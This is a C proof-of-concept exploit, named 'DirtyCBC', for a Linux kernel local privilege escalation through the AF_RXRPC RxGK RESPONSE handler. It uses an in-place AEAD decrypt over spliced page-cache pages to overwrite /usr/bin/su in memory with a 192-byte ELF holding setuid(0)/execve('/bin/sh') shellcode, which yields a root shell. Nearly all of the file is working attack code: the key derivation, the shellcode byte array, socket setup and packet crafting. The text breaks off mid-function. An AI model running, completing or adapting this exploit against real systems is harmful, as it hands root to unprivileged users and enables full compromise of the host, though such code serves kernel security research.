// SPDX-License-Identifier: GPL-2.0
/*
 * DirtyCBC — Linux kernel RxGK chosen-plaintext page-cache PoC
 * ============================================================
 *
 * One-line summary:
 *     An unprivileged local user writes arbitrary chosen plaintext
 *     into the page-cache content of any readable file by exploiting
 *     an in-place AEAD decrypt over an attacker-controlled
 *     scatter/gather list inside the kernel's RxGK (YFS-RxGK)
 *     RESPONSE handler.
 *
 * Demonstrated outcome:
 *     Cache-poison /usr/bin/su (mode 4755, world-readable) so its
 *     first page becomes a 192-byte ELF that does setuid(0) + execve
 *     "/bin/sh".  exec /usr/bin/su then drops a root shell.
 *
 * Vulnerable code path (mainline Linux):
 *
 *     net/rxrpc/rxgk_app.c    rxgk_extract_token() →
 *
 *         server_key = rxrpc_look_up_server_security(..., kvno, enctype);
 *         ...
 *         ret = rxgk_decrypt_skb(krb5, token_enc, skb,
 *                                &ticket_offset, &ticket_len, &ec);
 *
 *     rxgk_decrypt_skb performs an in-place AEAD decrypt over the
 *     RESPONSE skb's bytes [ticket_offset, ticket_offset+ticket_len),
 *     mapped directly via skb_to_sgvec().  Those bytes can be the
 *     attacker's MSG_SPLICE_PAGES'd page-cache pages, so the AES-CTS
 *     output overwrites those page-cache pages in place.  When the
 *     HMAC-SHA1 check fails afterwards the kernel aborts the
 *     connection — but the in-place mutation has already happened.
 *
 * Bug class:
 *     Same primitive class as DirtyFrag (CVE-2026-43284) on the
 *     RxKAD/FCRYPT path — in-place symmetric-crypto decrypt over an
 *     skb whose paged frags can be attacker-pinned page-cache pages.
 *     RxGK uses AES-256-CTS-HMAC-SHA1-96, which is not searchable by
 *     brute force.  The cryptographic technique used here (AES-CBC
 *     IV-XOR + RFC 3962 CTS-CS3 swap) reduces chosen-plaintext to one
 *     RFC 3961 KDF + a single AES-256 ECB block call per chosen
 *     16-byte block — microseconds.
 *
 * What "we control" in this scenario:
 *
 *     - K, the rxrpc_s server secret.  We add_key("rxrpc_s", desc, K, ...)
 *       and setsockopt RXRPC_SECURITY_KEYRING the keyring containing it
 *       onto our own AF_RXRPC server socket.  Therefore Ke (the
 *       AEAD-encryption key the kernel derives via RFC 3961 DK from K
 *       with usage RXGK_SERVER_ENC_TOKEN=1036) is computable to us.
 *     - Every byte of the RESPONSE packet we send.  We're the "client"
 *       too — but a fake plain-UDP one, not a real AF_RXRPC client, so
 *       we can hand-craft the wire format.
 *     - The bytes of the splice'd target file.  /usr/bin/su's first
 *       page is the same ELF on every Ubuntu install of util-linux,
 *       so target_block[i] is just public knowledge.
 *
 * The cryptographic technique
 * ---------------------------
 *
 *     Standard AES-CBC decryption:
 *
 *         P[i] = AES_DEC(Ke, C[i])  XOR  C[i-1]
 *
 *     The previous ciphertext block acts as an XOR mask on the next
 *     plaintext block.  If we control any block C[k] in the SGL, we
 *     control the XOR mask applied to P[k+1].
 *
 *     We INTERLEAVE the SGL fed to the kernel's AEAD:
 *
 *         wire[0]   = our user buffer  user_buf_0     (vmsplice'd anon)
 *         wire[1]   = target file page target_0       (splice'd file pg)
 *         wire[2]   = user_buf_1       (vmsplice'd anon)
 *         wire[3]   = target_1         (splice'd file pg)
 *         ...
 *         wire[2N-2]= user_buf_(N-1)
 *         wire[2N-1]= target_(N-1)        ← LAST block, CTS swap applies
 *
 *     For wire blocks 1..2N-2 (standard CBC pairs):
 *
 *         P[2i+1] = AES_DEC(Ke, target_i) XOR user_buf_i
 *         ⇒  user_buf_i = AES_DEC(Ke, target_i) XOR chosen_i
 *
 *     For the LAST block (RFC 3962 CS3 swaps the last two ciphertext
 *     blocks on the wire — the kernel's cts(cbc(aes)) implementation
 *     unswaps them at decrypt time):
 *
 *         P[2N-1] = AES_DEC(Ke, user_buf_(N-1)) XOR target_(N-1)
 *         ⇒  user_buf_(N-1) = AES_ENC(Ke, chosen_(N-1) XOR target_(N-1))
 *
 *     Plug those user_buf values into the SGL via vmsplice; the
 *     kernel's in-place AEAD decrypt writes our chosen plaintext into
 *     the target file's page-cache pages, overwriting target_i with
 *     chosen_i for all i.
 *
 * Frag-budget caveat
 * ------------------
 *
 *     MAX_SKB_FRAGS in upstream kernels is 17.  Each pipe buffer
 *     (vmsplice slot or splice slot) becomes one skb frag.  The
 *     framing of the RESPONSE packet costs ~3 frags, so each AEAD
 *     RESPONSE can interleave at most ~6 (user_buf, target) pairs =
 *     96 bytes of chosen plaintext.  We drop a 192-byte ELF in TWO
 *     RESPONSEs at offsets 0 and 96 of the target file.
 *
 * Build:
 *     cc -Os -s -o poc poc.c -lkeyutils -lcrypto
 *
 * Run (no privileges required, no preconfiguration required):
 *     ./poc                     # default target /usr/bin/su
 *     ./poc /usr/bin/passwd     # any other SUID-root, mode 0755 binary
 *
 * What happens:
 *     1. Module rxrpc.ko auto-loads via net-pf-33 alias when we open
 *        the first AF_RXRPC socket.
 *     2. We register a server secret K (random 32 bytes) under our
 *        own keyring as a YFS_RxGK (security index 6) entry with
 *        kvno=1, enctype=18 (aes256-cts-hmac-sha1-96).
 *     3. We start an AF_RXRPC server bound on 127.0.0.1:7000 with
 *        service-id 1234 and charge its accept-pool slots.
 *     4. From a plain UDP socket on loopback we send a CONNECT-DATA
 *        packet to that server; the kernel responds with CHALLENGE.
 *     5. We hand-craft a malicious RESPONSE whose ticket region is
 *        an interleaved SGL (vmsplice user buffers + splice target
 *        file pages), then splice the whole thing out the UDP socket.
 *     6. The kernel's RxGK code parses our RESPONSE, looks up K via
 *        kvno+enctype in our keyring, derives Ke, and AEAD-decrypts
 *        the ticket bytes IN PLACE — including the splice'd target
 *        pages — exactly producing our chosen plaintext.  HMAC fails
 *        (we don't try to forge it) and the connection aborts, but
 *        the page-cache pages have already been mutated.
 *     7. We exec the target binary.  Because /usr/bin/su is SUID
 *        root, the kernel sets euid=0 before loading; the loader
 *        reads the (poisoned) page-cache page and runs our 192-byte
 *        ELF, whose shellcode does setuid(0) + execve("/bin/sh").
 *     8. /bin/sh runs as root.
 *
 * Persistence:
 *     The corruption is in the page cache only — `dd iflag=direct` on
 *     the target binary still returns the original disk content.  The
 *     poisoned cache page persists until either (a) all processes that
 *     mmap'd the binary have exited AND drop_caches runs, (b) memory
 *     pressure forces eviction, (c) the inode is invalidated (touch),
 *     or (d) reboot.  While the cache is poisoned, ANY process on the
 *     system that exec's the target binary inherits the root shell.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/rxrpc.h>
#include <keyutils.h>
#include <openssl/evp.h>

/* Some distros' UAPI headers don't expose these; redefine if missing. */
#ifndef AF_RXRPC
# define AF_RXRPC               33
#endif
#ifndef SOL_RXRPC
# define SOL_RXRPC              272
#endif
#ifndef RXRPC_SECURITY_KEYRING
# define RXRPC_SECURITY_KEYRING 2
#endif
#ifndef RXRPC_USER_CALL_ID
# define RXRPC_USER_CALL_ID     1
#endif
#ifndef RXRPC_CHARGE_ACCEPT
# define RXRPC_CHARGE_ACCEPT    14
#endif

/* RxRPC packet types & flags from include/uapi/linux/rxrpc.h */
#define RXRPC_PACKET_TYPE_DATA      1
#define RXRPC_PACKET_TYPE_ACK       2
#define RXRPC_PACKET_TYPE_ABORT     4
#define RXRPC_PACKET_TYPE_CHALLENGE 6
#define RXRPC_PACKET_TYPE_RESPONSE  7
#define RXRPC_CLIENT_INITIATED      0x01
#define RXRPC_LAST_PACKET           0x04

/* Server-side RxGK parameters under our control. */
#define SRV_PORT  7000
#define SVC_ID    1234
#define KVNO      1
#define ENCTYPE   18      /* aes256-cts-hmac-sha1-96 */
#define KEY_LEN   32

/* Keyring name our server socket selects via RXRPC_SECURITY_KEYRING. */
#define KR_NAME   "rxgk_poc_kr"

/* Key-usage value the kernel passes to RFC 3961 DK when deriving the
 * server-side AEAD key for token decryption.  Defined in
 * net/rxrpc/rxgk_kdf.c as RXGK_SERVER_ENC_TOKEN. */
#define RXGK_SERVER_ENC_TOKEN  1036U

#define LOG(fmt, ...)  fprintf(stderr, "[+] " fmt "\n", ##__VA_ARGS__)
#define WARN(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
#define DIE(fmt, ...)  do { fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__); exit(1); } while (0)

/* RxRPC wire header layout, network byte order on the wire. */
struct rxrpc_wire_header {
	uint32_t epoch, cid, callNumber, seq, serial;
	uint8_t  type, flags, userStatus, securityIndex;
	uint16_t cksum;
	uint16_t serviceId;
} __attribute__((packed));

/* Globals filled at startup. */
static unsigned char SERVER_SECRET[KEY_LEN];
static unsigned char DERIVED_KE[KEY_LEN];

/* ===================================================================
 * Crypto: RFC 3961 nfold + DK over AES-256 ECB (via OpenSSL EVP).
 * ===================================================================
 */
static int gcdi(int a, int b) { while (b) { int t = b; b = a % b; a = t; } return a; }
static int lcmi(int a, int b) { return a / gcdi(a, b) * b; }

/* RFC 3961 §5.1 n-fold.  Maps an arbitrary-length byte string to a
 * fixed-length output by overlapping rotations and binary addition.
 * Implementation matches the kernel's rfc3961_nfold() (and MIT krb5). */
static void rfc3961_nfold(const uint8_t *in, int inlen,
			  uint8_t *out, int outlen)
{
	int ulcm = lcmi(inlen, outlen);
	int byte = 0;
	memset(out, 0, outlen);
	for (int i = ulcm - 1; i >= 0; i--) {
		int msbit = (((inlen * 8) - 1) +
			     (((inlen * 8) + 13) * (i / inlen)) +
			     ((inlen - (i % inlen)) * 8)) % (inlen * 8);
		byte += (((in[((inlen - 1) - (msbit >> 3)) % inlen] << 8) |
			  (in[((inlen)     - (msbit >> 3)) % inlen]))
			 >> ((msbit & 7) + 1)) & 0xff;
		byte += out[i % outlen];
		out[i % outlen] = byte & 0xff;
		byte >>= 8;
	}
	if (byte) {
		for (int i = outlen - 1; i >= 0; i--) {
			byte += out[i];
			out[i] = byte & 0xff;
			byte >>= 8;
		}
	}
}

/* AES-256 single-block ECB.  Used both directly (for the chosen-
 * plaintext IV-XOR / CTS-swap math) and as the building block for the
 * RFC 3961 DK construction below. */
static void aes256_ecb(int do_encrypt,
		       const uint8_t key[32],
		       const uint8_t in[16], uint8_t out[16])
{
	EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
	int len;
	if (do_encrypt) {
		EVP_EncryptInit_ex(ctx, EVP_aes_256_ecb(), NULL, key, NULL);
		EVP_CIPHER_CTX_set_padding(ctx, 0);
		EVP_EncryptUpdate(ctx, out, &len, in, 16);
	} else {
		EVP_DecryptInit_ex(ctx, EVP_aes_256_ecb(), NULL, key, NULL);
		EVP_CIPHER_CTX_set_padding(ctx, 0);
		EVP_DecryptUpdate(ctx, out, &len, in, 16);
	}
	EVP_CIPHER_CTX_free(ctx);
}

/* RFC 3961 DK for aes256-cts-hmac-sha1-96 (enctype 18):
 *     inblock = nfold(constant, 16)
 *     K1 = AES_ENC(K, inblock)
 *     K2 = AES_ENC(K, K1)
 *     DK = K1 || K2
 * Two iterations cover the 32-byte key required by AES-256. */
static void rfc3961_DK_aes256(const uint8_t K[32],
			      const uint8_t *constant, int clen,
			      uint8_t out[32])
{
	uint8_t inblock[16];
	if (clen == 16) memcpy(inblock, constant, 16);
	else            rfc3961_nfold(constant, clen, inblock, 16);
	aes256_ecb(1, K, inblock, &out[0]);
	aes256_ecb(1, K, &out[0], &out[16]);
}

/* Compute Ke = DK(K, usage|0xAA) for usage = RXGK_SERVER_ENC_TOKEN.
 * 0xAA is the "Ke" tag from RFC 3961 §5.3. */
static void compute_Ke(const uint8_t K[32], uint8_t Ke[32])
{
	uint8_t constant[5] = {
		0, 0,
		(RXGK_SERVER_ENC_TOKEN >> 8) & 0xff,
		 RXGK_SERVER_ENC_TOKEN       & 0xff,
		0xAA
	};
	rfc3961_DK_aes256(K, constant, 5, Ke);
}

/* ===================================================================
 * Self-contained 192-byte ELF dropper.
 * ===================================================================
 *
 * Layout (hex offsets):
 *
 *   0x00..0x3F   ELF64 e_hdr     (64 B)
 *   0x40..0x77   PT_LOAD PHE     (56 B)
 *   0x78..0xBF   shellcode + int3-fill (72 B)
 *
 * Properties:
 *   - Load base 0x10000000 (256 MiB).  Plenty of room above the
 *     loader's typical PIE base; trivially deterministic for x86_64.
 *   - ET_EXEC + a single PT_LOAD covering the full 0xC0 file.  No
 *     PIE so e_entry is fixed at link time.
 *   - Entry at 0x10000078, immediately after the headers.  The
 *     instruction stream is one clean run with no header bytes mixed
 *     in, so a reviewer can follow the disassembly directly.
 *   - Trap-fill (0xCC = int3) instead of NOP padding: any control
 *     transfer into the padding region SIGTRAPs immediately.
 *
 * Shellcode (28 B; 44 B trap-fill afterwards):
 *
 *     xor   edi, edi                   ; uid/gid argument = 0
 *     mov   al,  0x69                  ; SYS_setuid (105). rax==0 from
 *                                        execve so the high bytes are
 *                                        clean.
 *     syscall
 *     mov   rax, 0x0068732f6e69622f    ; "/bin/sh\0" little-endian.
 *     push  rax                        ; pathname now at [rsp]
 *     mov   rdi, rsp                   ; first execve() argument
 *     xor   esi, esi                   ; argv = NULL  (zero-extends rsi)
 *     xor   edx, edx                   ; envp = NULL
 *     xor   eax, eax                   ; CRITICAL: clear high bytes of
 *                                        rax left by the literal load.
 *                                        Without this, the kernel sees
 *                                        rax = 0x68732..3b and dispatches
 *                                        x32 mode → SIGSEGV.
 *     mov   al,  0x3b                  ; SYS_execve (59)
 *     syscall
 *
 * The setuid call promotes ruid+suid to 0; without it /bin/sh would
 * run with euid=0 but ruid=user, which causes some privileged
 * operations and most modern shells' security checks to differ.
 */
static const uint8_t TINY_ELF[192] = {
	/* --- ELF64 e_hdr (64 B) --- */
	0x7f, 'E', 'L', 'F', 2, 1, 1, 0,                                /* e_ident[0..7]    */
	0,    0,   0,   0,   0, 0, 0, 0,                                /* e_ident[8..15]   */
	0x02, 0x00,                                                     /* e_type = ET_EXEC */
	0x3e, 0x00,                                                     /* e_machine = EM_X86_64 */
	0x01, 0x00, 0x00, 0x00,                                         /* e_version = 1   */
	0x78, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,                 /* e_entry = 0x10000078 */
	0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                 /* e_phoff = 64    */
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                 /* e_shoff = 0     */
	0x00, 0x00, 0x00, 0x00,                                         /* e_flags = 0     */
	0x40, 0x00,                                                     /* e_ehsize = 64   */
	0x38, 0x00,                                                     /* e_phentsize = 56 */
	0x01, 0x00,                                                     /* e_phnum = 1     */
	0x00, 0x00,                                                     /* e_shentsize     */
	0x00, 0x00,                                                     /* e_shnum         */
	0x00, 0x00,                                                     /* e_shstrndx      */

	/* --- single PT_LOAD program header (56 B) at offset 0x40 --- */
	0x01, 0x00, 0x00, 0x00,                                         /* p_type  = PT_LOAD */
	0x05, 0x00, 0x00, 0x00,                                         /* p_flags = PF_R|PF_X */
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                 /* p_offset = 0    */
	0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,                 /* p_vaddr  = 0x10000000 */
	0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,                 /* p_paddr  = 0x10000000 */
	0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                 /* p_filesz = 192  */
	0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                 /* p_memsz  = 192  */
	0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                 /* p_align  = 0x1000 */

	/* --- shellcode at file offset 0x78 (= e_entry & 0xfff) --- 28 B --- */
	0x31, 0xff,                                                     /* xor edi, edi    */
	0xb0, 0x69,                                                     /* mov al, 0x69    ; setuid */
	0x0f, 0x05,                                                     /* syscall         */
	0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,     /* mov rax,"/bin/sh\0" */
	0x50,                                                           /* push rax        */
	0x48, 0x89, 0xe7,                                               /* mov rdi, rsp    */
	0x31, 0xf6,                                                     /* xor esi, esi    */
	0x31, 0xd2,                                                     /* xor edx, edx    */
	0x31, 0xc0,                                                     /* xor eax, eax    */
	0xb0, 0x3b,                                                     /* mov al, 0x3b    ; execve */
	0x0f, 0x05,                                                     /* syscall         */

	/* --- trap-fill (0xCC = int3) padding to 192 B --- */
	0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
	0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
	0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
	0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
	0xcc, 0xcc, 0xcc, 0xcc,
};

/* ===================================================================
 * AF_RXRPC server side: keyring + socket + accept-pool charge.
 * ===================================================================
 */
static long key_add(const char *type, const char *desc,
		    const void *payload, size_t plen, int ringid)
{
	return syscall(SYS_add_key, type, desc, payload, plen, ringid);
}

/* Add the rxrpc_s server key into a fresh, possessed keyring named
 * KR_NAME.  Both the keyring and the key are SETPERM'd so the rxrpc
 * kworker (which runs in init_cred context) can find the key during
 * keyring_search.  Returns the keyring's serial number. */
static key_serial_t setup_server_keyring(const uint8_t K[32])
{
	memcpy(SERVER_SECRET, K, KEY_LEN);
	key_serial_t kr = key_add("keyring", KR_NAME, NULL, 0,
				  KEY_SPEC_SESSION_KEYRING);
	if (kr < 0) DIE("keyring add: %s", strerror(errno));
	char desc[64];
	snprintf(desc, sizeof(desc), "%u:6:%u:%u", SVC_ID, KVNO, ENCTYPE);
	key_serial_t k = key_add("rxrpc_s", desc, SERVER_SECRET, KEY_LEN, kr);
	if (k < 0) DIE("rxrpc_s add: %s", strerror(errno));
	syscall(SYS_keyctl, 5 /*KEYCTL_SETPERM*/, kr, 0x3f3f3f3fUL);
	syscall(SYS_keyctl, 5 /*KEYCTL_SETPERM*/, k,  0x3f3f3f3fUL);
	LOG("keyring %s id=%d, rxrpc_s key id=%d", KR_NAME, kr, k);
	return kr;
}

/* Open an AF_RXRPC server socket bound to 127.0.0.1:SRV_PORT, with
 * SVC_ID and security keyring KR_NAME selected.  The bind/listen
 * makes the kernel allocate the rxrpc_local for this UDP port. */
static int open_rxrpc_server(void)
{
	int s = socket(AF_RXRPC, SOCK_DGRAM, AF_INET);
	if (s < 0) DIE("AF_RXRPC socket: %s", strerror(errno));
	if (setsockopt(s, SOL_RXRPC, RXRPC_SECURITY_KEYRING,
		       KR_NAME, strlen(KR_NAME)) < 0)
		DIE("RXRPC_SECURITY_KEYRING: %s", strerror(errno));
	struct sockaddr_rxrpc srx = { 0 };
	srx.srx_family            = AF_RXRPC;
	srx.srx_service           = SVC_ID;
	srx.transport_type        = SOCK_DGRAM;
	srx.transport_len         = sizeof(struct sockaddr_in);
	srx.transport.sin.sin_family      = AF_INET;
	srx.transport.sin.sin_port        = htons(SRV_PORT);
	srx.transport.sin.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	if (bind(s, (struct sockaddr *)&srx, sizeof(srx)) < 0)
		DIE("rxrpc bind: %s", strerror(errno));
	if (listen(s, 8) < 0) DIE("listen: %s", strerror(errno));
	LOG("AF_RXRPC server bound 127.0.0.1:%u svc=%u", SRV_PORT, SVC_ID);
	return s;
}

/* Charge the AF_RXRPC server's prealloc backlog with N slots so the
 * kernel will allocate incoming-call slots for our DATA packets.
 * Without this the kernel responds to CONNECT-DATA with a BUSY reject
 * (rxrpc_alloc_incoming_call returns NULL when call_count == 0). */
static void charge_accept_pool(int srv_fd, int n)
{
	for (int i = 0; i < n; i++) {
		unsigned long uid = (unsigned long)(i + 0x1000);
		uint8_t cbuf[CMSG_SPACE(sizeof(uid)) + CMSG_SPACE(0)];
		memset(cbuf, 0, sizeof(cbuf));
		struct msghdr m = { 0 };
		m.msg_control    = cbuf;
		m.msg_controllen = sizeof(cbuf);
		struct cmsghdr *c1 = CMSG_FIRSTHDR(&m);
		c1->cmsg_level = SOL_RXRPC;
		c1->cmsg_type  = RXRPC_USER_CALL_ID;
		c1->cmsg_len   = CMSG_LEN(sizeof(uid));
		memcpy(CMSG_DATA(c1), &uid, sizeof(uid));
		struct cmsghdr *c2 = CMSG_NXTHDR(&m, c1);
		c2->cmsg_level = SOL_RXRPC;
		c2->cmsg_type  = RXRPC_CHARGE_ACCEPT;
		c2->cmsg_len   = CMSG_LEN(0);
		m.msg_controllen = (char *)c2 + CMSG_SPACE(0) - (char *)cbuf;
		if (sendmsg(srv_fd, &m, 0) < 0)
			DIE("CHARGE_ACCEPT[%d]: %s", i, strerror(errno));
	}
	LOG("charged accept pool with %d slots", n);
}

/* ===================================================================
 * Fake plain-UDP "client" side: hand-crafted CONNECT-DATA, RESPONSE.
 * ===================================================================
 */
static int open_fake_client(void)
{
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	if (s < 0) DIE("UDP socket: %s", strerror(errno));
	int one = 1;
	setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
	struct sockaddr_in sa = {
		.sin_family      = AF_INET,
		.sin_port        = 0, /* ephemeral so multiple batches don't collide */
		.sin_addr.s_addr = htonl(INADDR_LOOPBACK),
	};
	if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		DIE("fake-cli bind: %s", strerror(errno));
	return s;
}

/* Send the initial CONNECT-DATA packet that triggers the kernel to
 * allocate a service connection and queue a CHALLENGE.  16 bytes of
 * 0xAA payload is fine — the kernel only inspects the wire header at
 * this point (sec_ix=6 chooses YFS_RxGK; LAST_PACKET+CLIENT_INITIATED
 * marks this as a client-originated single-packet DATA). */
static void send_connect_data(int udp, uint32_t epoch, uint32_t cid,
			      uint32_t callN, uint32_t serial)
{
	uint8_t pkt[28 + 16];
	memset(pkt, 0, sizeof(pkt));
	struct rxrpc_wire_header *h = (void *)pkt;
	h->epoch         = htonl(epoch);
	h->cid           = htonl(cid);
	h->callNumber    = htonl(callN);
	h->seq           = htonl(1);
	h->serial        = htonl(serial);
	h->type          = RXRPC_PACKET_TYPE_DATA;
	h->flags         = RXRPC_CLIENT_INITIATED | RXRPC_LAST_PACKET;
	h->securityIndex = 6;
	h->serviceId     = htons(SVC_ID);
	memset(pkt + 28, 0xAA, 16);
	struct sockaddr_in to = {
		.sin_family      = AF_INET,
		.sin_port        = htons(SRV_PORT),
		.sin_addr.s_addr = htonl(INADDR_LOOPBACK),
	};
	if (sendto(udp, pkt, sizeof(pkt), 0,
		   (struct sockaddr *)&to, sizeof(to)) < 0)
		DIE("CONNECT-DATA sendto: %s", strerror(errno));
}

/* Receive the kernel's CHALLENGE.  The kernel typically sends an ACK
 * in response to our DATA before the CHALLENGE arrives, so we drain
 * non-CHALLENGE packets up to a small limit. */
static ssize_t recv_challenge(int udp, uint8_t *buf, size_t cap,
			      struct sockaddr_in *src)
{
	for (int i = 0; i < 8; i++) {
		struct pollfd pfd = { .fd = udp, .events = POLLIN };
		if (poll(&pfd, 1, 2000) <= 0) return -1;
		socklen_t sl = sizeof(*src);
		ssize_t n = recvfrom(udp, buf, cap, 0,
				     (struct sockaddr *)src, &sl);
		if (n < (ssize_t)sizeof(struct rxrpc_wire_header)) continue;
		struct rxrpc_wire_header *h = (void *)buf;
		if (h->type == RXRPC_PACKET_TYPE_CHALLENGE) return n;
		if (h->type == RXRPC_PACKET_TYPE_ABORT)     return -1;
	}
	return -1;
}

/* ===================================================================
 * The chosen-plaintext attack itself.
 * ===================================================================
 *
 * Run one batch:
 *   - Compute user_buf_i for nblocks pairs (CBC formula for blocks
 *     0..nblocks-2, RFC 3962 CS3 swap formula for the last).
 *   - Open a fake-UDP "client".
 *   - Send CONNECT-DATA, receive CHALLENGE.
 *   - Build the malicious RESPONSE: wire header + RxGK_TokenContainer
 *     + interleaved [user_buf, target_page] SGL + HMAC zone +
 *     auth tail.
 *   - vmsplice + splice the assembled pieces into a pipe, then splice
 *     the pipe to the UDP socket.  This preserves separate skb frags
 *     so the kernel's skb_to_sgvec produces the SGL we want.
 */
static void do_chosen_plaintext_attack(const char *target_path,
				       const uint8_t *chosen_bytes,
				       size_t chosen_len,
				       off_t target_off)
{
	if (chosen_len % 16 != 0)
		DIE("chosen_len must be a multiple of 16");
	int nblocks = chosen_len / 16;
	if (nblocks > 8)
		DIE("nblocks > 8 exceeds MAX_SKB_FRAGS budget");

	/* Read the publicly-readable target file's bytes at this batch's
	 * offset; the IV-XOR / CTS-swap math needs them as plaintext. */
	int tfd = open(target_path, O_RDONLY);
	if (tfd < 0) DIE("open %s: %s", target_path, strerror(errno));
	uint8_t target_blocks[16 * 8];
	if (pread(tfd, target_blocks, chosen_len, target_off) != (ssize_t)chosen_len)
		DIE("pread target: %s", strerror(errno));

	/* Compute user_buf_i so that AEAD-decrypt produces chosen_i at
	 * the file's cache page in place. */
	uint8_t user_bufs[16 * 64];
	for (int i = 0; i < nblocks; i++) {
		if (i < nblocks - 1) {
			/* CBC formula: P[2i+1] = AES_DEC(Ke, target_i) XOR user_buf_i */
			uint8_t dec[16];
			aes256_ecb(0 /*decrypt*/, DERIVED_KE,
				   &target_blocks[16 * i], dec);
			for (int j = 0; j < 16; j++)
				user_bufs[16 * i + j] = dec[j] ^ chosen_bytes[16 * i + j];
		} else {
			/* CS3 swap formula for the last logical block:
			 *   P[2N-1] = AES_DEC(Ke, user_buf_(N-1)) XOR target_(N-1)
			 *   ⇒ user_buf_(N-1) = AES_ENC(Ke, chosen XOR target) */
			uint8_t xor_input[16];
			for (int j = 0; j < 16; j++)
				xor_input[j] = chosen_bytes[16 * i + j] ^ target_blocks[16 * i + j];
			aes256_ecb(1 /*encrypt*/, DERIVED_KE,
				   xor_input, &user_bufs[16 * i]);
		}
	}

	/* CONNECT-DATA → CHALLENGE handshake. */
	int udp = open_fake_client();
	uint32_t epoch = 0xDEADBEEF;
	/* Unique cid per batch so the server creates a fresh service
	 * connection and doesn't dedupe against the prior one. */
	uint32_t cid = 0x10000000 + ((uint32_t)target_off << 4);
	uint32_t callN = 1, serial = 1;
	send_connect_data(udp, epoch, cid, callN, serial);

	uint8_t rbuf[2048];
	struct sockaddr_in src;
	if (recv_challenge(udp, rbuf, sizeof(rbuf), &src) < 0)
		DIE("no CHALLENGE");
	struct rxrpc_wire_header *ch = (void *)rbuf;
	LOG("CHALLENGE received");

	/* Build the malicious RESPONSE wire header and framing fields. */
	uint32_t ticket_len = 32 * nblocks + 12;     /* AEAD ticket length */
	uint32_t token_len  = 12 + ticket_len;
	uint32_t auth_len   = 56;

	struct rxrpc_wire_header rmal = { 0 };
	rmal.epoch         = ch->epoch;
	rmal.cid           = ch->cid;
	rmal.callNumber    = htonl(0);
	rmal.seq           = htonl(0);
	rmal.serial        = htonl(serial + 1);
	rmal.type          = RXRPC_PACKET_TYPE_RESPONSE;
	rmal.flags         = RXRPC_CLIENT_INITIATED;   /* required, else io_thread discards */
	rmal.securityIndex = 6;
	rmal.serviceId     = htons(SVC_ID);

	/* hdr_pre = rxgk_response { start_time:be64, token_len:be32 }
	 *        || RXGK_TokenContainer { kvno:be32, enctype:be32, ticket_len:be32 } */
	uint8_t hdr_pre[12 + 12];
	memset(hdr_pre, 0, sizeof(hdr_pre));
	*(uint64_t *)(hdr_pre + 0)  = 0;                 /* start_time */
	*(uint32_t *)(hdr_pre + 8)  = htonl(token_len);
	*(uint32_t *)(hdr_pre + 12) = htonl(KVNO);
	*(uint32_t *)(hdr_pre + 16) = htonl(ENCTYPE);
	*(uint32_t *)(hdr_pre + 20) = htonl(ticket_len);

	/* HMAC zone: kernel reads the trailing 12 B as the HMAC tag.
	 * We don't try to forge a valid one; HMAC mismatch aborts the
	 * connection but the in-place decrypt has already happened. */
	uint8_t hmac_zone[12]; memset(hmac_zone, 0, 12);

	/* hdr_post: auth_len (be32) + 56 B of auth body.  The body
	 * just has to satisfy the parser; content is irrelevant to
	 * the iter189 decrypt site we're targeting. */
	uint8_t hdr_post[4 + 56];
	memset(hdr_post, 0xCC, sizeof(hdr_post));
	*(uint32_t *)(hdr_post + 0) = htonl(auth_len);

	if (connect(udp, (struct sockaddr *)&src, sizeof(src)) < 0)
		DIE("connect to server: %s", strerror(errno));

	/* Build the SGL via a pipe.  Each vmsplice (anon copy) and
	 * splice-from-file (page reference) becomes one pipe buffer →
	 * one skb fragment when we splice the pipe to the UDP socket
	 * with MSG_SPLICE_PAGES.  That fragment-per-buffer property is
	 * what gives us the interleaved SGL. */
	int pfd[2];
	if (pipe(pfd) < 0) DIE("pipe: %s", strerror(errno));
	fcntl(pfd[1], F_SETPIPE_SZ, 1 << 20);

	/* Stage 1: wire header + hdr_pre. */
	struct iovec iv0[2] = {
		{ .iov_base = &rmal,    .iov_len = sizeof(rmal)   },
		{ .iov_base = hdr_pre,  .iov_len = sizeof(hdr_pre) },
	};
	if (vmsplice(pfd[1], iv0, 2, 0) !=
	    (ssize_t)(sizeof(rmal) + sizeof(hdr_pre)))
		DIE("vmsplice pre: %s", strerror(errno));

	/* Stage 2: interleave (user_buf_i, target page) for nblocks blocks. */
	for (int i = 0; i < nblocks; i++) {
		struct iovec iv = { .iov_base = &user_bufs[16 * i],
				    .iov_len  = 16 };
		if (vmsplice(pfd[1], &iv, 1, 0) != 16)
			DIE("vmsplice user_buf[%d]: %s", i, strerror(errno));
		loff_t off = target_off + 16 * i;
		ssize_t s = splice(tfd, &off, pfd[1], NULL, 16, 0);
		if (s != 16)
